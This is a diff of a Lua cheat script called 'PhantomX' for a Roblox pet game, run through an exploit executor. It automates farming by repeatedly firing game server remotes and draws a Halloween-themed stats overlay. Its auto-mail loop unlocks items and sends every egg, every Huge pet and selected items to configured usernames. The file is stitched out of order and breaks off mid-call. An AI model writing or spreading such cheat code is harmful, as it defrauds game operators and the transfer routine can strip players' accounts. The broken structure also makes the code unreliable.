+        })
+        statsBorderTween:Play()
+
+        -- Fade in all stat text
+        for _, statBox in pairs(statsList:GetChildren()) do
+            if statBox:IsA("Frame") then
+                for _, child in pairs(statBox:GetChildren()) do
+                    if child:IsA("TextLabel") then
+                        spawn(function()
+                            local textFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                                TextTransparency = 0,
+                                TextStrokeTransparency = 0.8
+                            })
+                            textFade:Play()
+                        end)
+                    elseif child:IsA("Frame") and child.Name == "Divider" then
+                        spawn(function()
+                            local dividerFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                                BackgroundTransparency = 0.5
+                            })
+                            dividerFade:Play()
+                        end)
+                    end
+                end
+            end
+        end
+
+        wait(0.5)
+
+        -- Fade in status label
+        local statusFade = TweenService:Create(statusLabel, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.3
+        })
+        statusFade:Play()
+
+        -- Fade in feature status indicators with borders
+        wait(0.8)
+        for _, featureFrame in pairs(featureContainer:GetChildren()) do
+            if featureFrame:IsA("Frame") then
+                local background = featureFrame:FindFirstChild("Background")
+                if background then
+                    local backgroundFade = TweenService:Create(background, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                        BackgroundTransparency = 0
+                    })
+                    backgroundFade:Play()
+
+                    local borderFade = TweenService:Create(background.UIStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                        Transparency = 0.3
+                    })
+                    borderFade:Play()
+
+                    for _, child in pairs(background:GetChildren()) do
+                        if child:IsA("TextLabel") then
+                            local textFade = TweenService:Create(child, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                                TextTransparency = 0
+                            })
+                            textFade:Play()
+                        end
+                    end
+                end
+            end
+        end
+
+        -- Fade in FPS counter
+        wait(0.3)
+        local fpsFrameFade = TweenService:Create(fpsFrame, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        fpsFrameFade:Play()
+
+        local fpsBorderFade = TweenService:Create(fpsBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
+        })
+        fpsBorderFade:Play()
+
+        local fpsTextFade = TweenService:Create(fpsLabel, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.8
+        })
+        fpsTextFade:Play()
+
+        -- Fade in Halloween decorations
+        wait(0.5)
+        for _, child in pairs(mainFrame:GetChildren()) do
+            if child.Name == "SpiderWeb" or child.Name == "Pumpkin" then
+                local decorationFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                    ImageTransparency = child.Name == "SpiderWeb" and 0.3 or 0.5
+                })
+                decorationFade:Play()
+            end
+        end
+
+        -- Start glow animation
+        wait(1)
+        local glowFadeIn = TweenService:Create(glowOverlay, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {BackgroundTransparency = 0.95})
+        glowFadeIn:Play()
+    end
+
+    -- Start animations and intro
+    spawn(animateGradient)
+    spawn(playIntroAnimation)
+    spawn(updateUptime)
+    spawn(updateFPSCounter)
+    spawn(updateDiamonds)
+    spawn(updateRank)
+    spawn(updateCandy)
+    spawn(updateHats)
+    spawn(initializeCounts)
+    spawn(updateCounts)
+    wait(5)
+    spawn(pulseGlow)
+
+    --==[ FULL ORIGINAL UI SCRIPT END ]==--
+end
+
+local function RunFastFarm()
+    -- Wait for game to load
+    repeat task.wait() until game:IsLoaded()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TeleportService = game:GetService("TeleportService")
+    local RunService = game:GetService("RunService")
+    
+    repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+    repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    
+    -- Load libraries
+    local Library = ReplicatedStorage.Library
+    local Client = Library.Client
+    local Save = require(Client.Save).Get().Inventory
+    local Network = require(Library.Client.Network)
+    
+    --==[ PLACE ID CHECK AND TELEPORT ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoJoinEvent then
+        local targetPlaceId = getgenv().PhantomXConfig.TargetPlaceId or 131952481663528
+        
+        if game.PlaceId ~= targetPlaceId then
+            updateStatusLabel("Joining Halloween Event...")
+            print("[PhantomX] Not in target place, teleporting to Halloween event...")
+            TeleportService:Teleport(targetPlaceId, LocalPlayer)
+            return
+        else
+            updateStatusLabel("In Halloween Event - Script Ready")
+            print("[PhantomX] Already in Halloween event place, continuing...")
+        end
+    end
+    
+    --==[ FPS CAP SYSTEM ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.FPSCap then
+        setfpscap(getgenv().PhantomXConfig.FPSCap)
+        task.spawn(function()
+            while true do
+                if getgenv().PhantomXConfig and getgenv().PhantomXConfig.FPSCap then
+                    setfpscap(getgenv().PhantomXConfig.FPSCap)
+                end
+                task.wait(10)
+            end
+        end)
+    end
+    
+    --==[ FIND PLAYER BASE ]==--
+    local playerBaseNumber = nil
+    
+    local function findPlayerBase()
+        updateStatusLabel("Searching for base...")
+        
+        -- Wait for things to load
+        task.wait(0.5)
+        
+        local plotsFolder = workspace:FindFirstChild("__THINGS")
+        if not plotsFolder then
+            updateStatusLabel("ERROR - No __THINGS folder")
+            return nil
+        end
+        
+        local plots = plotsFolder:FindFirstChild("Plots")
+        if not plots then
+            updateStatusLabel("ERROR - No Plots folder")
+            return nil
+        end
+        
+        local playerName = LocalPlayer.Name
+        print("[PhantomX] Searching for base owned by: " .. playerName)
+        
+        -- Check all plots
+        for _, plot in pairs(plots:GetChildren()) do
+            print("[PhantomX] Checking plot: " .. plot.Name)
+            
+            -- Use a safer approach to navigate the hierarchy
+            local success, result = pcall(function()
+                local titleText = plot.Build.Base.Attachment.BillboardGui.Title.Text
+                return titleText
+            end)
+            
+            if success then
+                print("[PhantomX] Found title: " .. result)
+                if string.find(result, playerName) then
+                    local baseNum = tonumber(plot.Name)
+                    updateStatusLabel("Found base #" .. baseNum)
+                    print("[PhantomX] SUCCESS: Found player base at plot #" .. baseNum)
+                    return baseNum
+                end
+            else
+                print("[PhantomX] Could not access plot " .. plot.Name .. ": " .. tostring(result))
+            end
+        end
+        
+        updateStatusLabel("Base not found")
+        print("[PhantomX] ERROR: Could not find player's base")
+        return nil
+    end
+    
+    -- Find player's base on script start
+    spawn(function()
+        playerBaseNumber = findPlayerBase()
+    end)
+    
+    --==[ AUTO FARM HATS ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoFarmHats then
+        task.spawn(function()
+            local hatConnection
+            hatConnection = RunService.Heartbeat:Connect(function()
+                if playerBaseNumber then
+                    pcall(function()
+                        updateStatusLabel("Farming hats at base #" .. playerBaseNumber)
+                        local args = {
+                            playerBaseNumber,  -- Use the found base number
+                            "PurchaseEgg",
+                            2,
+                            1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Plots_Invoke"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.EggsOpened = getgenv().PhantomXSessionStats.EggsOpened + 1
+                    end)
+                else
+                    -- Try to find base again if not found
+                    playerBaseNumber = findPlayerBase()
+                end
+                task.wait(0.1) -- Wait 0.1 seconds between executions
+            end)
+        end)
+    end
+    
+    --==[ AUTO COLLECT CANDY ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoCollectCandy then
+        task.spawn(function()
+            while true do
+                if getgenv().PhantomXConfig.AutoCollectCandy then
+                    pcall(function()
+                        updateStatusLabel("Collecting candy...")
+                        for i = 1, 10 do
+                            local args = {i}
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("HalloweenWorld_Claim"):InvokeServer(unpack(args))
+                            getgenv().PhantomXSessionStats.CandyCollected = getgenv().PhantomXSessionStats.CandyCollected + 1
+                            task.wait(0.01)
+                        end
+                    end)
+                end
+                task.wait(0.1) -- Small delay before next cycle
+            end
+        end)
+    end
+    
+    --==[ UPGRADE SYSTEMS (RUN EVERY 1 SECOND) ]==--
+    
+    -- Egg Luck Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.EggLuckUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.EggLuckUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Egg Luck...")
+                        local args = {"HalloweenEggLuck"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    -- More Witch Hats Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.MoreWitchHatsUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.MoreWitchHatsUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Witch Hats...")
+                        local args = {"HalloweenMoreWitchHats"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    -- More Halloween Candy Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Halloween Candy...")
+                        local args = {"HalloweenCandyMultiplier"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    --==[ AUTO MAIL SYSTEM ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoMail and getgenv().PhantomXConfig.AutoMail.Enabled then
+        local function getMailCost()
+            local Constants = require(ReplicatedStorage.Library.Balancing.Constants)
+            local MailboxTypes = require(ReplicatedStorage.Library.Types.Mailbox)
+            local currentSave = require(ReplicatedStorage.Library.Client.Save).Get()
+            
+            local baseCost = Constants.MailboxDiamondCost
+            local growthRate = MailboxTypes.DiamondCostGrowthRate
+            local sends = currentSave.MailboxSendsSinceReset or 0 
+            return baseCost * math.pow(growthRate, sends)
+        end
+
+        local function parseItemName(itemName, itemClass)
+            local parsed = {
+                baseName = itemName,
+                tn = nil,
+                sh = nil,
+            }
+            
+            if itemClass == "Pet" then
+                local workingName = itemName
+                
+                if workingName:find("Shiny") then
+                    parsed.sh = true
+                    workingName = workingName:gsub("Shiny ", ""):gsub(" Shiny", "")
+                end
+                
+                if workingName:find("Rainbow") then
+                    parsed.tn = 2
+                    workingName = workingName:gsub("Rainbow ", ""):gsub(" Rainbow", "")
+                elseif workingName:find("Gold") then
+                    parsed.tn = 1
+                    workingName = workingName:gsub("Gold ", ""):gsub(" Gold", "")
+                end
+                
+                parsed.baseName = workingName:gsub("^%s+", ""):gsub("%s+$", ""):gsub("%s+", " ")
+                
+            elseif itemClass ~= "Pet" then
+                local enchantName, tier = itemName:match("^(.+)%s+(%d+)$")
+                if enchantName and tier then
+                    parsed.baseName = enchantName:gsub("^%s+", ""):gsub("%s+$", "")
+                    parsed.tn = tonumber(tier)
+                else
+                    parsed.baseName = itemName
+                end
+            end
+            
+            return parsed
+        end
+
+        task.spawn(function()
+            while task.wait(getgenv().PhantomXConfig.AutoMail['Loop Interval'] or 60) do
+                pcall(function()
+                    local Queue = {}
+                    
+                    local currentSave = require(Client.Save).Get()
+                    if not currentSave or not currentSave.Inventory then 
+                        return 
+                    end
+                    
+                    for Class, Items in pairs(currentSave.Inventory) do
+                        for uid, v in pairs(Items) do
+                            local PetCheck = (Class == "Pet") and string.find(v.id, "Huge")
+                            local Config = false
+                            
+                            for configItemName, Info in pairs(getgenv().PhantomXConfig.AutoMail['Items']) do
+                                if Info.Class == Class then
+                                    local parsed = parseItemName(configItemName, Info.Class)
+                                    
+                                    local nameMatch = (parsed.baseName == v.id)
+                                    local tierMatch = (parsed.tn == nil or parsed.tn == v.tn)
+                                    local shinyMatch = (parsed.sh == nil or parsed.sh == v.sh)
+                                    local amountMatch = ((Info.Amount or 0) <= (v._am or 1))
+                                    
+                                    if nameMatch and tierMatch and shinyMatch and amountMatch then
+                                        Config = true
+                                        break
+                                    end
+                                end
+                            end
+                            
+                            if Class == "Egg" or Config or PetCheck then
+                                if not Queue[uid] then
+                                    Queue[uid] = { Class = Class, Info = v }
+                                end
+                            end
+                        end
+                    end
+                    
+                    for uid, Data in pairs(Queue) do
+                        local v = Data.Info
+                        
+                        if v._lk then
+                            while not Network.Invoke("Locking_SetLocked", uid, false) do
+                                task.wait(0.1)
+                            end
+                        end
+                        
+                        local SendAmount = (v._am or 1)
+                        if Data.Class == "Currency" then
+                            local mailCost = getMailCost()
+                            SendAmount = SendAmount - mailCost
+                        end
+                        
+                        local recipient = getgenv().PhantomXConfig.AutoMail['Users'][math.random(1, #getgenv().PhantomXConfig.AutoMail['Users'])]
+                        
+                        pcall(function()
+                            Network.Invoke("Mailbox: Send", 
+                                recipient, 
+                                "Bless", 
+--==[ PhantomX Configurable Script Loader ]==--
+
+getgenv().PhantomXConfig = {
+    StatsUiEnabled = true,   -- Run the PhantomX GUI once
+    FastFarmEnabled = true,   -- Run the Fast Farm once
+    FPSCap = 5,              -- FPS cap setting
+    WebhookURL = "",         -- Your Discord webhook URL
+    DiscordID = "",          -- Your Discord user ID for pings
+    ShowUsername = true,     -- Show username in UI (true) or hide it (false)
+    AutoMail = {             -- Auto mail settings
+        Enabled = true,
+        ['Items'] = {
+            ["Shiny Flamingo Cat"] = { Class = "Pet", Amount = 1 },
+            ["Damage 8"] = { Class = "Potion", Amount = 2},
+            ["Tap Power 7"] = {Class = "Enchant", Amount = 6 },
+        },
+        ['Loop Interval'] = 60,
+        ['Users'] = {"YourUsername"},  -- Replace with actual username(s)
+    },
+    AutoDaycare = true,      -- Auto daycare management
+    AutoClaimMailbox = true, -- Auto claim mailbox
+    AutoUseToys = true,      -- Auto use toys (buffs)
+    AutoEatFruits = true,    -- Auto eat fruits
+    
+    -- New Halloween Event Features
+    AutoJoinEvent = true,    -- Auto join Halloween event
+    TargetPlaceId = 131952481663528, -- Target place ID for Halloween event
+    
+    -- Upgrade Features (run every 1 second when enabled)
+    EggLuckUpgrade = true,   -- Auto upgrade Egg Luck
+    MoreWitchHatsUpgrade = true, -- Auto upgrade More Witch Hats
+    MoreHalloweenCandyUpgrade = true, -- Auto upgrade More Halloween Candy
+    
+    -- Auto Farm Features
+    AutoFarmHats = true,     -- Auto farm hats
+    AutoCollectCandy = true, -- Auto collect candy
+}
+
+--==[ SHARED SESSION COUNTERS ]==--
+getgenv().PhantomXSessionStats = getgenv().PhantomXSessionStats or {
+    HugesGained = 0,
+    TitanicsGained = 0,
+    GargantuansGained = 0,
+    EggsOpened = 0,
+    CandyCollected = 0,
+    UpgradesPurchased = 0
+}
+
+--==[ Function Wrappers ]==--
+
+local function updateStatusLabel(status)
+    if getgenv().PhantomXStatusLabel then
+        getgenv().PhantomXStatusLabel.Text = status
+    end
+end
+
+local function RunStatsUI()
+    --==[ FULL ORIGINAL UI SCRIPT START ]==
+
+    -- PhantomX GUI Recreation - Halloween Edition
+    -- Works with any executor
+
+    local TweenService = game:GetService("TweenService")
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local player = Players.LocalPlayer
+
+    -- WAIT FOR GAME TO FULLY LOAD
+    repeat task.wait() until game:IsLoaded()
+    repeat task.wait() until not player.PlayerGui:FindFirstChild("__INTRO")
+    repeat task.wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    
+    -- WAIT FOR LIBRARIES TO LOAD
+    repeat task.wait(0.5) until ReplicatedStorage:FindFirstChild("Library")
+    local Library = ReplicatedStorage:WaitForChild("Library")
+    local Client = Library:WaitForChild("Client")
+    
+    -- Wait a bit more to ensure everything is loaded
+    task.wait(3)
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PhantomXGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = game:GetService("CoreGui")
+
+    -- Main Frame (Full Screen)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.BackgroundTransparency = 1
+    mainFrame.Parent = screenGui
+
+    -- Animated gradient background (Halloween colors)
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 30)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 5, 15)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 15, 20))
+    }
+    gradient.Rotation = 45
+    gradient.Parent = mainFrame
+
+    -- Glow effect overlay (Orange/Purple Halloween theme)
+    local glowOverlay = Instance.new("Frame")
+    glowOverlay.Name = "GlowOverlay"
+    glowOverlay.Size = UDim2.new(1, 0, 1, 0)
+    glowOverlay.BackgroundTransparency = 1
+    glowOverlay.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+    glowOverlay.BorderSizePixel = 0
+    glowOverlay.Parent = mainFrame
+
+    local glowGradient = Instance.new("UIGradient")
+    glowGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(150, 50, 200)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 120, 0))
+    }
+    glowGradient.Rotation = -45
+    glowGradient.Parent = glowOverlay
+
+    -- Halloween Decorations: Spider Webs
+    local function createSpiderWeb(position, size)
+        local web = Instance.new("ImageLabel")
+        web.Name = "SpiderWeb"
+        web.Size = UDim2.new(0, size, 0, size)
+        web.Position = position
+        web.BackgroundTransparency = 1
+        web.Image = "rbxassetid://13764396720" -- Spider web image
+        web.ImageTransparency = 0.7
+        web.Parent = mainFrame
+        return web
+    end
+
+    -- Create spider webs in corners
+    createSpiderWeb(UDim2.new(0, 10, 0, 10), 80)
+    createSpiderWeb(UDim2.new(1, -90, 0, 10), 80)
+    createSpiderWeb(UDim2.new(0, 10, 1, -90), 80)
+    createSpiderWeb(UDim2.new(1, -90, 1, -90), 80)
+
+    -- Halloween Decorations: Pumpkins
+    local function createPumpkin(position, size)
+        local pumpkin = Instance.new("ImageLabel")
+        pumpkin.Name = "Pumpkin"
+        pumpkin.Size = UDim2.new(0, size, 0, size)
+        pumpkin.Position = position
+        pumpkin.BackgroundTransparency = 1
+        pumpkin.Image = "rbxassetid://13764394418" -- Pumpkin image
+        pumpkin.ImageTransparency = 0.8
+        pumpkin.Parent = mainFrame
+        return pumpkin
+    end
+
+    -- Create pumpkins around the edges
+    createPumpkin(UDim2.new(0.1, 0, 0, 20), 60)
+    createPumpkin(UDim2.new(0.9, -60, 0, 20), 60)
+    createPumpkin(UDim2.new(0.3, 0, 1, -80), 60)
+    createPumpkin(UDim2.new(0.7, -60, 1, -80), 60)
+
+    -- Intro Container
+    local introContainer = Instance.new("Frame")
+    introContainer.Name = "IntroContainer"
+    introContainer.Size = UDim2.new(1, 0, 1, 0)
+    introContainer.BackgroundTransparency = 1
+    introContainer.Parent = mainFrame
+    introContainer.ZIndex = 10
+
+    local introText = Instance.new("TextLabel")
+    introText.Name = "IntroText"
+    introText.Size = UDim2.new(0, 800, 0, 150)
+    introText.Position = UDim2.new(0.5, -400, 0.5, -75)
+    introText.BackgroundTransparency = 1
+    introText.Text = "Welcome To PhantomX"
+    introText.TextColor3 = Color3.fromRGB(255, 140, 0)
+    introText.TextSize = 60
+    introText.Font = Enum.Font.GothamBold
+    introText.TextTransparency = 1
+    introText.TextStrokeTransparency = 1
+    introText.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    introText.Parent = introContainer
+
+    local creditsText = Instance.new("TextLabel")
+    creditsText.Name = "CreditsText"
+    creditsText.Size = UDim2.new(0, 400, 0, 80)
+    creditsText.Position = UDim2.new(0.5, -200, 0.5, -40)
+    creditsText.BackgroundTransparency = 1
+    creditsText.Text = "By Topp"
+    creditsText.TextColor3 = Color3.fromRGB(255, 140, 0)
+    creditsText.TextSize = 48
+    creditsText.Font = Enum.Font.GothamBold
+    creditsText.TextTransparency = 1
+    creditsText.TextStrokeTransparency = 1
+    creditsText.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    creditsText.Parent = introContainer
+
+    -- Title Container with glow
+    local titleContainer = Instance.new("Frame")
+    titleContainer.Name = "TitleContainer"
+    titleContainer.Size = UDim2.new(0, 600, 0, 100)
+    titleContainer.Position = UDim2.new(0.5, -300, 0.15, 0)
+    titleContainer.BackgroundTransparency = 1
+    titleContainer.Parent = mainFrame
+
+    local titleScale = Instance.new("UIScale")
+    titleScale.Scale = 1
+    titleScale.Parent = titleContainer
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Size = UDim2.new(1, 0, 1, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "🎃 Thanks for using PhantomX! 👻"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    titleLabel.TextSize = 42
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextTransparency = 1
+    titleLabel.TextStrokeTransparency = 1
+    titleLabel.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    titleLabel.Parent = titleContainer
+
+    --==[ NEW: Rank Container ]==--
+    local rankContainer = Instance.new("Frame")
+    rankContainer.Name = "RankContainer"
+    rankContainer.Size = UDim2.new(0, 400, 0, 60)
+    rankContainer.Position = UDim2.new(0.5, -200, 0.25, 0)
+    rankContainer.BackgroundTransparency = 1
+    rankContainer.Parent = mainFrame
+
+    local rankScale = Instance.new("UIScale")
+    rankScale.Scale = 1
+    rankScale.Parent = rankContainer
+
+    local rankFrame = Instance.new("Frame")
+    rankFrame.Name = "RankFrame"
+    rankFrame.Size = UDim2.new(1, 0, 1, 0)
+    rankFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    rankFrame.BorderSizePixel = 0
+    rankFrame.BackgroundTransparency = 1
+    rankFrame.Parent = rankContainer
+
+    local rankBlur = Instance.new("Frame")
+    rankBlur.Size = UDim2.new(1, 0, 1, 0)
+    rankBlur.BackgroundColor3 = Color3.fromRGB(30, 20, 35)
+    rankBlur.BackgroundTransparency = 1
+    rankBlur.BorderSizePixel = 0
+    rankBlur.Parent = rankFrame
+
+    local rankCorner = Instance.new("UICorner")
+    rankCorner.CornerRadius = UDim.new(0, 12)
+    rankCorner.Parent = rankFrame
+
+    local rankCorner2 = Instance.new("UICorner")
+    rankCorner2.CornerRadius = UDim.new(0, 12)
+    rankCorner2.Parent = rankBlur
+
+    local rankBorder = Instance.new("UIStroke")
+    rankBorder.Color = Color3.fromRGB(150, 50, 200)
+    rankBorder.Thickness = 2
+    rankBorder.Transparency = 1
+    rankBorder.Parent = rankFrame
+
+    local rankValue = Instance.new("TextLabel")
+    rankValue.Name = "RankValue"
+    rankValue.Size = UDim2.new(1, -40, 1, 0)
+    rankValue.Position = UDim2.new(0, 20, 0, 0)
+    rankValue.BackgroundTransparency = 1
+    rankValue.Text = "Loading..."
+    rankValue.TextColor3 = Color3.fromRGB(255, 140, 0)
+    rankValue.TextSize = 24
+    rankValue.Font = Enum.Font.GothamBold
+    rankValue.TextTransparency = 1
+    rankValue.TextStrokeTransparency = 1
+    rankValue.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    rankValue.TextXAlignment = Enum.TextXAlignment.Center
+    rankValue.Parent = rankBlur
+
+    -- Stats Container Frame
+    local statsContainer = Instance.new("Frame")
+    statsContainer.Name = "StatsContainer"
+    statsContainer.Size = UDim2.new(0, 1000, 0, 100)
+    statsContainer.Position = UDim2.new(0.5, -500, 0.35, 0)
+    statsContainer.BackgroundTransparency = 1
+    statsContainer.Parent = mainFrame
+
+    local statsScale = Instance.new("UIScale")
+    statsScale.Scale = 1
+    statsScale.Parent = statsContainer
+
+    local statsFrame = Instance.new("Frame")
+    statsFrame.Name = "StatsFrame"
+    statsFrame.Size = UDim2.new(1, 0, 1, 0)
+    statsFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    statsFrame.BorderSizePixel = 0
+    statsFrame.BackgroundTransparency = 1
+    statsFrame.Parent = statsContainer
+
+    local statsBlur = Instance.new("Frame")
+    statsBlur.Size = UDim2.new(1, 0, 1, 0)
+    statsBlur.BackgroundColor3 = Color3.fromRGB(30, 20, 35)
+    statsBlur.BackgroundTransparency = 1
+    statsBlur.BorderSizePixel = 0
+    statsBlur.Parent = statsFrame
+
+    local statsCorner = Instance.new("UICorner")
+    statsCorner.CornerRadius = UDim.new(0, 12)
+    statsCorner.Parent = statsFrame
+
+    local statsCorner2 = Instance.new("UICorner")
+    statsCorner2.CornerRadius = UDim.new(0, 12)
+    statsCorner2.Parent = statsBlur
+
+    local statsBorder = Instance.new("UIStroke")
+    statsBorder.Color = Color3.fromRGB(255, 140, 0)
+    statsBorder.Thickness = 2
+    statsBorder.Transparency = 1
+    statsBorder.Parent = statsFrame
+
+    -- Determine username display
+    local displayName = (getgenv().PhantomXConfig and getgenv().PhantomXConfig.ShowUsername) and player.Name or "Hidden"
+
+    -- Create stat boxes (replaced Eggs hatched with Candy and Hat counters)
+    local statData = {
+        {title = "Username", value = displayName},
+        {title = "Uptime", value = "00:00:00"},
+        {title = "Candy", value = "0"},
+        {title = "Hats", value = "0"},
+        {title = "Huges", value = "+0"},
+        {title = "Titanics", value = "+0"},
+        {title = "Diamonds", value = "0"}
+    }
+
+    local statsList = Instance.new("Frame")
+    statsList.Name = "StatsList"
+    statsList.Size = UDim2.new(1, -40, 1, -20)
+    statsList.Position = UDim2.new(0, 20, 0, 10)
+    statsList.BackgroundTransparency = 1
+    statsList.Parent = statsBlur
+
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.FillDirection = Enum.FillDirection.Horizontal
+    listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    listLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    listLayout.Padding = UDim.new(0, 15)
+    listLayout.Parent = statsList
+
+    local uptimeLabel = nil
+    local diamondsLabel = nil
+    local hugesLabel = nil
+    local titanicsLabel = nil
+    local candyLabel = nil
+    local hatsLabel = nil
+    local nameLabel = nil
+
+    for i, stat in ipairs(statData) do
+        local statBox = Instance.new("Frame")
+        statBox.Name = stat.title .. "Box"
+        statBox.Size = UDim2.new(0.14, -12, 1, 0) -- Adjusted size for 7 items
+        statBox.BackgroundTransparency = 1
+        statBox.Parent = statsList
+
+        local statTitle = Instance.new("TextLabel")
+        statTitle.Name = "Title"
+        statTitle.Size = UDim2.new(1, 0, 0, 30)
+        statTitle.Position = UDim2.new(0, 0, 0, 15)
+        statTitle.BackgroundTransparency = 1
+        statTitle.Text = stat.title
+        statTitle.TextColor3 = Color3.fromRGB(180, 150, 200)
+        statTitle.TextSize = 14
+        statTitle.Font = Enum.Font.GothamMedium
+        statTitle.TextScaled = true
+        statTitle.TextTransparency = 1
+        statTitle.Parent = statBox
+
+        local titleConstraint = Instance.new("UITextSizeConstraint")
+        titleConstraint.MaxTextSize = 14
+        titleConstraint.Parent = statTitle
+
+        local statValue = Instance.new("TextLabel")
+        statValue.Name = "Value"
+        statValue.Size = UDim2.new(1, 0, 0, 35)
+        statValue.Position = UDim2.new(0, 0, 0, 45)
+        statValue.BackgroundTransparency = 1
+        statValue.Text = stat.value
+        statValue.TextColor3 = Color3.fromRGB(255, 140, 0)
+        statValue.TextSize = 24
+        statValue.Font = Enum.Font.GothamBold
+        statValue.TextScaled = true
+        statValue.TextTransparency = 1
+        statValue.TextStrokeTransparency = 1
+        statValue.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+        statValue.Parent = statBox
+
+        local valueConstraint = Instance.new("UITextSizeConstraint")
+        valueConstraint.MaxTextSize = 24
+        valueConstraint.Parent = statValue
+
+        if stat.title == "Username" then
+            nameLabel = statValue
+        elseif stat.title == "Uptime" then
+            uptimeLabel = statValue
+        elseif stat.title == "Diamonds" then
+            diamondsLabel = statValue
+        elseif stat.title == "Huges" then
+            hugesLabel = statValue
+        elseif stat.title == "Titanics" then
+            titanicsLabel = statValue
+        elseif stat.title == "Candy" then
+            candyLabel = statValue
+        elseif stat.title == "Hats" then
+            hatsLabel = statValue
+        end
+
+        if i < #statData then
+            local divider = Instance.new("Frame")
+            divider.Name = "Divider"
+            divider.Size = UDim2.new(0, 1, 0.6, 0)
+            divider.Position = UDim2.new(1, 7, 0.2, 0)
+            divider.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+            divider.BackgroundTransparency = 1
+            divider.BorderSizePixel = 0
+            divider.Parent = statBox
+        end
+    end
+
+    --==[ NEW: Status Label - Big Orange Outlined Text ]==--
